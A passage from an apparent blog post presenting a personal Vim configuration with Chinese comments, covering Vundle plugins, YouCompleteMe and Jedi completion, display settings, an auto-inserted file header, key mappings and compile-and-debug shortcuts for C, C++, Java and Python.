class="line"><span class="string"> Plugin 'plasticboy/vim-markdown'</span></span><br><span class="line"><span class="string"> Plugin 'scrooloose/nerdcommenter'</span></span><br><span class="line"><span class="string"> Plugin 'sjl/gundo.vim'</span></span><br><span class="line"><span class="string"> Plugin 'tpope/vim-sleuth'</span></span><br><span class="line"><span class="string"> Plugin 'tpope/vim-surround'</span></span><br><span class="line"><span class="string"> Plugin 'tpope/vim-fugitive'</span></span><br><span class="line"><span class="string"> Plugin 'tyru/open-browser.vim'</span></span><br><span class="line"><span class="string"> Plugin 'vim-scripts/a.vim'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span> Color schemes</span><br><span class="line"> Plugin <span class="string">'tomasr/molokai'</span></span><br><span class="line"> Plugin <span class="string">'flazz/vim-colorschemes'</span></span><br><span class="line"></span><br><span class="line"> call vundle<span class="comment">#end()</span></span><br><span class="line">filetype plugin indent on</span><br><span class="line"></span><br><span class="line"><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span></span><br><span class="line"><span class="string">" =&gt; YouCompleteMe  代码自动补全  Begin</span></span><br><span class="line"><span class="string">"</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">" 自动补全配置</span></span><br><span class="line"><span class="string">set completeopt=longest,menu "让Vim的补全菜单行为与一般IDE一致(参考VimTip1228)</span></span><br><span class="line"><span class="string">autocmd InsertLeave * if pumvisible() == 0|pclose|endif "离开插入模式后自动关闭预览窗口</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;CR&gt;       pumvisible() ? "\&lt;C-y&gt;" : "\&lt;CR&gt;" "回车即选中当前项</span></span><br><span class="line"><span class="string">"上下左右键的行为 会显示其他信息</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;Down&gt;     pumvisible() ? "\&lt;C-n&gt;" : "\&lt;Down&gt;"</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;Up&gt;       pumvisible() ? "\&lt;C-p&gt;" : "\&lt;Up&gt;"</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;PageDown&gt; pumvisible() ? "\&lt;PageDown&gt;\&lt;C-p&gt;\&lt;C-n&gt;" : "\&lt;PageDown&gt;"</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;PageUp&gt;   pumvisible() ? "\&lt;PageUp&gt;\&lt;C-p&gt;\&lt;C-n&gt;" : "\&lt;PageUp&gt;"</span></span><br><span class="line"><span class="string">"youcompleteme  默认tab  s-tab 和自动补全冲突</span></span><br><span class="line"><span class="string">"let g:ycm_key_list_select_completion=['&lt;c-n&gt;']</span></span><br><span class="line"><span class="string">"let g:ycm_key_list_select_completion = ['&lt;Down&gt;']</span></span><br><span class="line"><span class="string">"let g:ycm_key_list_previous_completion=['&lt;c-p&gt;']</span></span><br><span class="line"><span class="string">"let g:ycm_key_list_previous_completion = ['&lt;Up&gt;']</span></span><br><span class="line"><span class="string">let g:ycm_confirm_extra_conf=0 "关闭加载.ycm_extra_conf.py提示</span></span><br><span class="line"><span class="string">let g:ycm_collect_identifiers_from_tags_files=1 " 开启 YCM 基于标签引擎</span></span><br><span class="line"><span class="string">let g:ycm_min_num_of_chars_for_completion=1 " 从第2个键入字符就开始罗列匹配项</span></span><br><span class="line"><span class="string">let g:ycm_cache_omnifunc=0 " 禁止缓存匹配项,每次都重新生成匹配项</span></span><br><span class="line"><span class="string">let g:ycm_seed_identifiers_with_syntax=1 " 语法关键字补全</span></span><br><span class="line"><span class="string">nnoremap &lt;F5&gt; :YcmForceCompileAndDiagnostics&lt;CR&gt; "force recomile with syntastic</span></span><br><span class="line"><span class="string">"nnoremap &lt;leader&gt;lo :lopen&lt;CR&gt; "open locationlist</span></span><br><span class="line"><span class="string">"nnoremap &lt;leader&gt;lc :lclose&lt;CR&gt; "close locationlist</span></span><br><span class="line"><span class="string">inoremap &lt;leader&gt;&lt;leader&gt; &lt;C-x&gt;&lt;C-o&gt;</span></span><br><span class="line"><span class="string">"在注释输入中也能补全</span></span><br><span class="line"><span class="string">let g:ycm_complete_in_comments = 1</span></span><br><span class="line"><span class="string">"在字符串输入中也能补全</span></span><br><span class="line"><span class="string">let g:ycm_complete_in_strings = 1</span></span><br><span class="line"><span class="string">"注释和字符串中的文字也会被收入补全</span></span><br><span class="line"><span class="string">let g:ycm_collect_identifiers_from_comments_and_strings = 0</span></span><br><span class="line"><span class="string">nnoremap &lt;leader&gt;jd :YcmCompleter GoToDefinitionElseDeclaration&lt;CR&gt; " 跳转到定义处</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"为了Python3的第三方库安装Jedi插件</span></span><br><span class="line"><span class="string">Plugin 'davidhalter/jedi-vim'</span></span><br><span class="line"><span class="string">"===============================Jedi==================================</span></span><br><span class="line"><span class="string">if has('python3')</span></span><br><span class="line"><span class="string">let g:loaded_youcompleteme = 1 " 判断如果是python3的话，就禁用ycmd。</span></span><br><span class="line"><span class="string">let g:jedi#force_py_version = 3</span></span><br><span class="line"><span class="string">let g:pymode_python = 'python3'</span></span><br><span class="line"><span class="string">endif</span></span><br><span class="line"><span class="string">"===============================Jedi===================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">" =&gt; YouCompleteMe  代码自动补全  End</span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">" 设置配色方案</span></span><br><span class="line"><span class="string">" colorscheme torte</span></span><br><span class="line"><span class="string">" colorscheme murphy</span></span><br><span class="line"><span class="string">" colorscheme desert </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"字体 </span></span><br><span class="line"><span class="string">"if (has("gui_running")) </span></span><br><span class="line"><span class="string">"   set guifont=Bitstream\ Vera\ Sans\ Mono\ 10 </span></span><br><span class="line"><span class="string">"endif </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">" 显示相关  </span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">set shortmess=atI   " 启动的时候不显示那个援助乌干达儿童的提示  </span></span><br><span class="line"><span class="string">"winpos 5 5          " 设定窗口位置  </span></span><br><span class="line"><span class="string">"set lines=40 columns=155    " 设定窗口大小  </span></span><br><span class="line"><span class="string">set go=             " 不要图形按钮  </span></span><br><span class="line"><span class="string">"color asmanian2     " 设置背景主题  </span></span><br><span class="line"><span class="string">"set guifont=Courier_New:h10:cANSI   " 设置字体  </span></span><br><span class="line"><span class="string">syntax on           " 语法高亮  </span></span><br><span class="line"><span class="string">autocmd InsertLeave * se nocul  " 用浅色高亮当前行  </span></span><br><span class="line"><span class="string">autocmd InsertEnter * se cul    " 用浅色高亮当前行  </span></span><br><span class="line"><span class="string">set ruler           " 显示标尺  </span></span><br><span class="line"><span class="string">set showcmd         " 输入的命令显示出来，看的清楚些  </span></span><br><span class="line"><span class="string">set cmdheight=1     " 命令行（在状态行下）的高度，设置为1  </span></span><br><span class="line"><span class="string">set whichwrap+=&lt;,&gt;,h,l   " 允许backspace和光标键跨越行边界(不建议)  </span></span><br><span class="line"><span class="string">set scrolloff=3     " 光标移动到buffer的顶部和底部时保持3行距离  </span></span><br><span class="line"><span class="string">set novisualbell    " 不要闪烁(不明白)  </span></span><br><span class="line"><span class="string">set statusline=%F%m%r%h%w\ [FORMAT=%&#123;&amp;ff&#125;]\ [TYPE=%Y]\ [POS=%l,%v][%p%%]\ %&#123;strftime(\"%d/%m/%y\ -\ %H:%M\")&#125;   "状态行显示的内容  </span></span><br><span class="line"><span class="string">set laststatus=1    " 启动显示状态行(1),总是显示状态行(2)  </span></span><br><span class="line"><span class="string">"set foldenable      " 允许折叠  </span></span><br><span class="line"><span class="string">set foldmethod=manual   " 手动折叠  </span></span><br><span class="line"><span class="string">"set background=dark "背景使用黑色 </span></span><br><span class="line"><span class="string">" 显示中文帮助</span></span><br><span class="line"><span class="string">if version &gt;= 603</span></span><br><span class="line"><span class="string">    set helplang=cn</span></span><br><span class="line"><span class="string">    set encoding=utf-8</span></span><br><span class="line"><span class="string">endif</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""</span></span><br><span class="line"><span class="string">"""</span><span class="string">""</span>新文件标题</span><br><span class="line"><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span></span><br><span class="line"><span class="string">"新建.c,.h,.sh,.java文件，自动插入文件头 </span></span><br><span class="line"><span class="string">autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec "</span>:call SetTitle()<span class="string">" </span></span><br><span class="line"><span class="string">"</span><span class="string">"定义函数SetTitle，自动插入文件头 </span></span><br><span class="line"><span class="string">func SetTitle() </span></span><br><span class="line"><span class="string">    "</span>如果文件类型为.sh文件 </span><br><span class="line">    <span class="keyword">if</span> &amp;filetype == <span class="string">'sh'</span> </span><br><span class="line">    call setline(<span class="number">1</span>,<span class="string">"\#########################################################################"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>), <span class="string">"\# File Name: "</span>.expand(<span class="string">"%"</span>)) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">1</span>, <span class="string">"\# Author: Function_Dou"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">2</span>, <span class="string">"\# mail: NOT"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">3</span>, <span class="string">"\# Created Time: "</span>.strftime(<span class="string">"%c"</span>)) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">4</span>, <span class="string">"\#########################################################################"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">5</span>, <span class="string">"\#!/bin/bash"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">6</span>, <span class="string">""</span>) </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    call setline(<span class="number">1</span>, <span class="string">"/*************************************************************************"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>), <span class="string">"    &gt; File Name: "</span>.expand(<span class="string">"%"</span>)) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">1</span>, <span class="string">"    &gt; Author: Function_Dou"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">2</span>, <span class="string">"    &gt; Mail: NOT"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">3</span>, <span class="string">"    &gt; Created Time: "</span>.strftime(<span class="string">"%c"</span>)) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">4</span>, <span class="string">" ************************************************************************/"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">5</span>, <span class="string">""</span>)</span><br><span class="line">    endif</span><br><span class="line">    <span class="keyword">if</span> &amp;filetype == <span class="string">'cpp'</span></span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">6</span>, <span class="string">"#include &lt;stdio.h&gt;"</span>)</span><br><span class="line">   <span class="string">"call append(line("</span>.<span class="string">")+7, "</span> <span class="string">")</span></span><br><span class="line"><span class="string">   "</span>call append(line(<span class="string">"."</span>)+<span class="number">8</span>, <span class="string">""</span>)</span><br><span class="line">    endif</span><br><span class="line">    <span class="keyword">if</span> &amp;filetype == <span class="string">'c'</span></span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">6</span>, <span class="string">"#include &lt;stdio.h&gt;"</span>)</span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">7</span>, <span class="string">""</span>)</span><br><span class="line">    endif</span><br><span class="line">    <span class="string">"    if &amp;filetype == 'java'</span></span><br><span class="line"><span class="string">    "</span>        call append(line(<span class="string">"."</span>)+<span class="number">6</span>,<span class="string">"public class "</span>.expand(<span class="string">"%"</span>))</span><br><span class="line">    <span class="string">"        call append(line("</span>.<span class="string">")+7,"</span><span class="string">")</span></span><br><span class="line"><span class="string">    "</span>    endif</span><br><span class="line">    <span class="string">"新建文件后，自动定位到文件末尾</span></span><br><span class="line"><span class="string">    autocmd BufNewFile * normal G</span></span><br><span class="line"><span class="string">endfunc </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""""</span></span><br><span class="line"><span class="string">"键盘命令</span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">nmap &lt;leader&gt;w :w!&lt;cr&gt;</span></span><br><span class="line"><span class="string">nmap &lt;leader&gt;f :find&lt;cr&gt;</span></span><br><span class="line"><span class="string">" 映射全选+复制 ctrl+a</span></span><br><span class="line"><span class="string">map &lt;C-A&gt; ggVGY</span></span><br><span class="line"><span class="string">map! &lt;C-A&gt; &lt;Esc&gt;ggVGY</span></span><br><span class="line"><span class="string">map &lt;F12&gt; gg=G</span></span><br><span class="line"><span class="string">" 选中状态下 Ctrl+c 复制</span></span><br><span class="line"><span class="string">vmap &lt;C-c&gt; "+y</span></span><br><span class="line"><span class="string">"去空行  </span></span><br><span class="line"><span class="string">nnoremap &lt;F4&gt; :g/^\s*$/d&lt;CR&gt; </span></span><br><span class="line"><span class="string">"比较文件  </span></span><br><span class="line"><span class="string">nnoremap &lt;C-F4&gt; :vert diffsplit </span></span><br><span class="line"><span class="string">"新建标签  </span></span><br><span class="line"><span class="string">map &lt;M-F4&gt; :tabnew&lt;CR&gt;  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">" vim-scripts 中的插件 "</span></span><br><span class="line"><span class="string">Plugin 'taglist.vim'</span></span><br><span class="line"><span class="string">"ctags 配置:F3快捷键显示程序中的各种tags，包括变量和函数等。</span></span><br><span class="line"><span class="string">map &lt;F3&gt; :TlistToggle&lt;CR&gt;</span></span><br><span class="line"><span class="string">let Tlist_Use_Right_Window=1</span></span><br><span class="line"><span class="string">let Tlist_Show_One_File=1</span></span><br><span class="line"><span class="string">let Tlist_Exit_OnlyWindow=1</span></span><br><span class="line"><span class="string">let Tlist_WinWidt=25</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"列出当前目录文件  </span></span><br><span class="line"><span class="string">"map &lt;F2&gt; :tabnew .&lt;CR&gt;  </span></span><br><span class="line"><span class="string">"打开树状文件目录  </span></span><br><span class="line"><span class="string">"map &lt;C-F2&gt; \be  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">""将F3设置为开关NERDTree的快捷键</span></span><br><span class="line"><span class="string">"map &lt;F2&gt; :NERDTreeMirror&lt;CR&gt;</span></span><br><span class="line"><span class="string">map &lt;F2&gt; :NERDTreeToggle .&lt;CR&gt;</span></span><br><span class="line"><span class="string">""修改树的显示图标</span></span><br><span class="line"><span class="string">let g:NERDTreeDirArrowExpandable = '+'</span></span><br><span class="line"><span class="string">let g:NERDTreeDirArrowCollapsible = '-'</span></span><br><span class="line"><span class="string">""窗口位置</span></span><br><span class="line"><span class="string">let g:NERDTreeWinPos='left'</span></span><br><span class="line"><span class="string">""窗口尺寸</span></span><br><span class="line"><span class="string">let g:NERDTreeSize=30</span></span><br><span class="line"><span class="string">""窗口是否显示行号</span></span><br><span class="line"><span class="string">let g:NERDTreeShowLineNumbers=1</span></span><br><span class="line"><span class="string">""不显示隐藏文件</span></span><br><span class="line"><span class="string">let g:NERDTreeHidden=0</span></span><br><span class="line"><span class="string">""打开vim时如果没有文件自动打开NERDTree</span></span><br><span class="line"><span class="string">"autocmd vimenter * if !argc()|NERDTree|endif</span></span><br><span class="line"><span class="string">""当NERDTree为剩下的唯一窗口时自动关闭</span></span><br><span class="line"><span class="string">"autocmd bufenter * if (winnr("$") == 1 &amp;&amp; exists("b:NERDTree") &amp;&amp; b:NERDTree.isTabTree()) | q | endif</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"C，C++ 按F5编译运行</span></span><br><span class="line"><span class="string">map &lt;F5&gt; :call CompileRunGcc()&lt;CR&gt;</span></span><br><span class="line"><span class="string">func! CompileRunGcc()</span></span><br><span class="line"><span class="string">    exec "w"</span></span><br><span class="line"><span class="string">    if &amp;filetype == 'c'</span></span><br><span class="line"><span class="string">    exec "!g++ % -o %&lt;"</span></span><br><span class="line"><span class="string">    exec "! ./%&lt;"</span></span><br><span class="line"><span class="string">    elseif &amp;filetype == 'cpp'</span></span><br><span class="line"><span class="string">    exec "!g++ % -o %&lt;"</span></span><br><span class="line"><span class="string">    exec "! ./%&lt;"</span></span><br><span class="line"><span class="string">    elseif &amp;filetype == 'java' </span></span><br><span class="line"><span class="string">    exec "!javac %" </span></span><br><span class="line"><span class="string">    exec "!java %&lt;"</span></span><br><span class="line"><span class="string">    elseif &amp;filetype == 'sh'</span></span><br><span class="line"><span class="string">    :!./%</span></span><br><span class="line"><span class="string">    elseif &amp;filetype == 'py'</span></span><br><span class="line"><span class="string">    exec "!python %"</span></span><br><span class="line"><span class="string">    exec "!python %&lt;"</span></span><br><span class="line"><span class="string">    endif</span></span><br><span class="line"><span class="string">endfunc</span></span><br><span class="line"><span class="string">"C,C++的调试</span></span><br><span class="line"><span class="string">map &lt;F8&gt; :call Rungdb()&lt;CR&gt;</span></span><br><span class="line"><span class="string">func! Rungdb()</span></span><br><span class="line"><span class="string">    exec "w"</span></span><br><span class="line"><span class="string">    exec "!g++ % -g -o %&lt;"</span></span><br><span class="line"><span class="string">    exec "!gdb ./%&lt;"</span></span><br><span class="line"><span class="string">endfunc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">""实用设置</span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""</span></span><br><span class="line"><span class="string">" 设置当文件被改动时自动载入</span></span><br><span class="line"><span class="string">set autoread</span></span><br><span class="line"><span class="string">"</span> quickfix模式</span><br><span class="line">autocmd FileType c,cpp map &lt;buffer&gt; &lt;leader&gt;&lt;space&gt; :w&lt;cr&gt;:make&lt;cr&gt;</span><br><span class="line"><span class="string">"代码补全 </span></span><br><span class="line"><span class="string">set completeopt=preview,menu </span></span><br><span class="line"><span class="string">"</span> set completeopt=longest,menu</span><br><span class="line"><span class="string">"允许插件  </span></span><br><span class="line"><span class="string">filetype plugin on</span></span><br><span class="line"><span class="string">"</span>共享剪贴板  </span><br><span class="line">set clipboard+=unnamed </span><br><span class="line"><span class="string">"从不备份  </span></span><br><span class="line"><span class="string">set nobackup</span></span><br><span class="line"><span class="string">"</span>make 运行</span><br><span class="line">:set makeprg=g++\ -Wall\ \ %</span><br><span class="line"><span class="string">"自动保存</span></span><br><span class="line"><span class="string">set autowrite</span></span><br><span class="line"><span class="string">set ruler                   "</span> 打开状态栏标尺</span><br><span class="line">set cursorline              <span class="string">" 突出显示当前行</span></span><br><span class="line"><span class="string">set magic                   "</span> 设置魔术</span><br><span class="line">set guioptions-=T           <span class="string">" 隐藏工具栏</span></span><br><span class="line"><span class="string">set guioptions-=m           "</span> 隐藏菜单栏</span><br><span class="line"><span class="string">"set statusline=\ %&lt;%F[%1*%M%*%n%R%H]%=\ %y\ %0(%&#123;&amp;fileformat&#125;\ %&#123;&amp;encoding&#125;\ %c:%l/%L%)\</span></span><br><span class="line"><span class="string">"</span> 设置在状态行显示的信息</span><br><span class="line">set foldcolumn=<span class="number">0</span></span><br><span class="line">set foldmethod=indent </span><br><span class="line">set foldlevel=<span class="number">3</span> </span><br><span class="line">set foldenable              <span class="string">" 开始折叠</span></span><br><span class="line"><span class="string">"</span> 不要使用vi的键盘模式，而是vim自己的</span><br><span class="line">set nocompatible</span><br><span class="line"><span class="string">" 语法高亮</span></span><br><span class="line"><span class="string">set syntax=on</span></span><br><span class="line"><span class="string">"</span> 去掉输入错误的提示声音</span><br><span class="line">set noeb</span><br><span class="line"><span class="string">" 在处理未保存或只读文件的时候，弹出确认</span></span><br><span class="line"><span class="string">set confirm</span></span><br><span class="line"><span class="string">"</span> 自动缩进</span><br><span class="line">set autoindent</span><br><span class="line">set cindent</span><br><span class="line"><span class="string">" Tab键的宽度</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">"</span> 统一缩进为<span class="number">4</span></span><br><span class="line">set softtabstop=<span class="number">4</span></span><br><span class="line">set shiftwidth=<span class="number">4</span></span><br><span class="line"><span class="string">" 不要用空格代替制表符</span></span><br><span class="line"><span class="string">set noexpandtab</span></span><br><span class="line"><span class="string">"</span> 在行和段开始处使用制表符</span><br><span class="line">set smarttab</span><br><span class="line"><span class="string">" 显示行号</span></span><br><span class="line"><span class="string">set number</span></span><br><span class="line"><span class="string">"</span> 历史记录数</span><br><span class="line">set history=<span class="number">1000</span></span><br><span class="line"><span class="string">"禁止生成临时文件</span></span><br><span class="line"><span class="string">set nobackup</span></span><br><span class="line"><span class="string">set noswapfile</span></span><br><span class="line"><span class="string">"</span>搜索忽略大小写</span><br><span class="line">set ignorecase</span><br><span class="line"><span class="string">"搜索逐字符高亮</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">set incsearch</span></span><br><span class="line"><span class="string">"</span>行内替换</span><br><span class="line">set gdefault</span><br><span class="line"><span class="string">"编码设置</span></span><br><span class="line"><span class="string">set enc=utf-8</span></span><br><span class="line"><span class="string">set fencs=utf-8,ucs-bom,shift-jis,gb18030,gbk,gb2312,cp936</span></span><br><span class="line"><span class="string">"</span>语言设置</span><br><span class="line">set langmenu=zh_CN.UTF<span class="number">-8</span></span><br><span class="line">set helplang=cn</span><br><span class="line"><span class="string">" 我的状态行显示的内容（包括文件类型和解码）</span></span><br><span class="line"><span class="string">"</span>set statusline=%F%m%r%h%w\ [FORMAT=%&#123;&amp;ff&#125;]\ [TYPE=%Y]\ [POS=%l,%v][%p%%]\ %&#123;strftime(\<span class="string">"%d/%m/%y\ -\ %H:%M\")&#125;</span></span><br><span class="line"><span class="string">"</span>set statusline=[%F]%y%r%m%*%=[Line:%l/%L,Column:%c][%p%%]</span><br><span class="line"><span class="string">" 总是显示状态行</span></span><br><span class="line"><span class="string">set laststatus=2</span></span><br><span class="line"><span class="string">"</span> 命令行（在状态行下）的高度，默认为<span class="number">1</span>，这里是<span class="number">2</span></span><br><span class="line">set cmdheight=<span class="number">2</span></span><br><span class="line"><span class="string">" 侦测文件类型</span></span><br><span class="line"><span class="string">filetype on</span></span><br><span class="line"><span class="string">"</span> 载入文件类型插件</span><br><span class="line">filetype plugin on</span><br><span class="line"><span class="string">" 为特定文件类型载入相关缩进文件</span></span><br><span class="line"><span class="string">filetype indent on</span></span><br><span class="line"><span class="string">"</span> 保存全局变量</span><br><span class="line">set viminfo+=!</span><br><span class="line"><span class="string">" 带有如下符号的单词不要被换行分割</span></span><br><span class="line"><span class="string">set iskeyword+=_,$,@,%,#,-</span></span><br><span class="line"><span class="string">"</span> 字符间插入的像素行数目</span><br><span class="line">set linespace=<span class="number">0</span></span><br><span class="line"><span class="string">" 增强模式中的命令行自动完成操作</span></span><br><span class="line"><span class="string">set wildmenu</span></span><br><span class="line"><span class="string">"</span> 使回格键（backspace）正常处理indent, eol, start等</span><br><span class="line">set backspace=<span class="number">2</span></span><br><span class="line"><span class="string">" 允许backspace和光标键跨越行边界</span></span><br><span class="line"><span class="string">set whichwrap+=&lt;,&gt;,h,l</span></span><br><span class="line"><span class="string">"</span> 可以在buffer的任何地方使用鼠标（类似office中在工作区双击鼠标定位）</span><br><span class="line">set mouse=a</span><br><span class="line">set selection=exclusive</span><br><span class="line">set selectmode=mouse,key</span><br><span class="line"><span class="string">" 通过使用: commands命令，告诉我们文件的哪一行被改变过</span></span><br><span class="line"><span class="string">set report=0</span></span><br><span class="line"><span class="string">"</span> 在被分割的窗口间显示空白，便于阅读</span><br><span class="line">set fillchars=vert:\ ,stl:\ ,stlnc:\</span><br><span class="line"><span class="string">" 高亮显示匹配的括号</span></span><br><span class="line"><span class="string">set showmatch</span></span><br><span class="line"><span class="string">"</span> 匹配括号高亮的时间（单位是十分之一秒）</span><br><span class="line">set matchtime=<span class="number">1</span></span><br><span class="line"><span class="string">" 光标移动到buffer的顶部和底部时保持3行距离</span></span><br><span class="line"><span class="string">set scrolloff=3</span></span><br><span class="line"><span class="string">"</span> 为C程序提供自动缩进</span><br><span class="line">set smartindent</span><br><span class="line"><span class="string">" 高亮显示普通txt文件（需要txt.vim脚本）</span></span><br><span class="line"><span class="string">au BufRead,BufNewFile *  setfiletype txt</span></span><br><span class="line"><span class="string">"</span>自动补全</span><br><span class="line">:inoremap ( ()&lt;ESC&gt;i</span><br><span class="line">:inoremap ) &lt;c-r&gt;=ClosePair(<span class="string">')'</span>)&lt;CR&gt;</span><br><span class="line"><span class="string">":inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O</span></span><br><span class="line"><span class="string">"</span>:inoremap &#125; &lt;c-r&gt;=ClosePair(<span class="string">'&#125;'</span>)&lt;CR&gt;</span><br><span class="line">:inoremap [ []&lt;ESC&gt;i</span><br><span class="line">:inoremap ] &lt;c-r&gt;=ClosePair(<span class="string">']'</span>)&lt;CR&gt;</span><br><span class="line">:inoremap <span class="string">" "</span><span class="string">"&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">:inoremap ' ''&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">function! ClosePair(char)</span></span><br><span class="line"><span class="string">    if getline('.')[col('.') - 1] == a:char</span></span><br><span class="line"><span class="string">    return "</span>\&lt;Right&gt;<span class="string">"</span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">    return a:char</span></span><br><span class="line"><span class="string">    endif</span></span><br><span class="line"><span class="string">endfunction</span></span><br><span class="line"><span class="string">filetype plugin indent on </span></span><br><span class="line"><span class="string">"</span>打开文件类型检测, 加了这句才可以用智能补全</span><br><span class="line">set completeopt=longest,menu</span><br><span class="line"></span><br><span class="line"><span class="string">" ctages 插件</span></span><br><span class="line"><span class="string">set tags=/home/rpz/tags</span></span><br></pre></td></tr></table></figure>








      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
